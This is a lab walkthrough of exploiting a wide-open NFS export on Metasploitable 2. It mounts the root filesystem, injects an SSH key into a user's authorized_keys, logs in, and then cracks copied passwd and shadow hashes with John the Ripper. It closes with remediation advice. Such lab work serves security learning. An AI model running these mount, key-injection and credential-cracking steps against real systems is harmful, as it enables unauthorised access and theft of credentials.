## Insecure NFS Export & SSH Key Injection
This is a technical walkthrough of exploiting an insecurely configured NFS export on a target (Metasploitable 2) to achieve root access via SSH key injection.


### 1. Enumeration & Reconnaissance

The target was identified within the local network at `192.168.56.101`. A full port scan was conducted to identify running services.

* **Nmap Scan:**
```bash
nmap -p- -A -T4 192.168.56.101 -oN metasploitable_scan.txt

```


* **Findings:** Port **2049/tcp** was identified as active, running the Network File System (NFS) service.

### 2. NFS Share Discovery

To investigate the NFS configuration, the RPC portmapper and export list were queried.

* **RPC Check:** `rpcinfo -p 192.168.56.101` confirmed `mountd` and `nfs` services were registered.
* **Export List:**
```bash
showmount -e 192.168.56.101
# Export list for 192.168.56.101:
# / *

```


> **Critical Vulnerability:** The entire root directory (`/`) is exported with a wildcard (`*`), allowing any remote host to mount the filesystem.


---

### 3. Exploitation: NFS Mounting & Key Injection

By mounting the remote root filesystem, an attacker can modify system files or user configurations.

#### Step 1: Mount the Filesystem

```bash
sudo mkdir -p /tmp/metasploitable_nfs
sudo mount -t nfs -o nfsvers=3,nolock 192.168.56.101:/ /tmp/metasploitable_nfs

```

#### Step 2: Establish Persistence (SSH Key Injection)

Instead of cracking passwords, a generated public key was injected into the `msfadmin` user's authorized keys.

1. **Generate local keys:** `ssh-keygen -t rsa -f ~/.ssh/metasploitableV2`
2. **Inject Key:**
```bash
cat ~/.ssh/metasploitableV2.pub | sudo tee -a /tmp/metasploitable_nfs/home/msfadmin/.ssh/authorized_keys

```


---

### 4. Post-Exploitation: Remote Access

Access was gained via SSH. Due to the age of the target (Metasploitable 2), the SSH client required explicit permission to use the legacy `ssh-rsa` algorithm.

* **Command:**
```bash
ssh -i ~/.ssh/metasploitableV2 \
    -o HostKeyAlgorithms=+ssh-rsa \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    msfadmin@192.168.56.101

```


### 5. Remediation Recommendations

1. **Restrict NFS Exports:** Edit `/etc/exports` to share only specific directories and restrict access to authorized IP addresses rather than using `*`.
2. **Enable Root Squash:** Ensure `root_squash` is enabled to prevent remote root users from having root privileges on the mount.
3. **Update SSH Configurations:** Upgrade the SSH daemon to support modern cryptographic algorithms and disable password-based login if keys are preferred.


### Cracking passwords with `John the Ripper`
1. Copy the `msfadmin/home/etc/passwd` and `msfadmin/etc/shadow` files to `~/Desktop` or other location
2. Combine the two:

```bash
sudo unshadow passwd.txt shadow.txt > combined.txt
```

3. Try 'single crack' with john the ripper for common `username/password' pairs`:

`john --single combined.txt`

This returns:
```bash
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Remaining 4 password hashes with 4 different salts
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
user             (user)
postgres         (postgres)
msfadmin         (msfadmin)
```
